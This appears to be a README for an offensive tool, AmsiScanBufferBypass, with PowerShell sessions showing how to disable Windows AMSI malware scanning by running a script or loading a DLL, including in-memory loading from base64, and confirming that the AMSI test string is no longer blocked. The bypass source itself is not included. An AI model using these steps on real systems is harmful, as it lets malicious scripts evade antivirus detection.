## AmsiScanBufferBypass

## Usage
### PowerShell

`ASBBypass.ps1` works in both `x64` and `x86` processes.

```
PS > Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
At line:1 char:1
+ Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS > .\ASBBypass.ps1

PS > Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify
that the path is correct and try again.
At line:1 char:1
+ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (AMSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

### DLL

The C# can be compiled to an `x64` or `x86` DLL - make sure to load the correct one depending on your process architecture.

```
PS > [System.Reflection.Assembly]::LoadFile("D:\Tools\ASBBypass\ASBBypass\bin\x64\Debug\ASBBypass.dll")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     D:\Tools\ASBBypass\ASBBypass\bin\x64\Debug\ASBBypass.dll

PS > [AMSI.Bypass]::Disable()
0

PS D:\Tools\ASBBypass> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify
that the path is correct and try again.
At line:1 char:1
+ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (AMSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

```
PS > $DLL = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("D:\Tools\ASBBypass\ASBBypass\bin\x64\Debug\ASBBypass.dll"))

PS > [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String($DLL))

PS > [AMSI.Bypass]::Disable()
0

PS > Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'
AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify
that the path is correct and try again.
At line:1 char:1
+ AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386
+ ~~~~
    + CategoryInfo          : ObjectNotFound: (AMSI:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```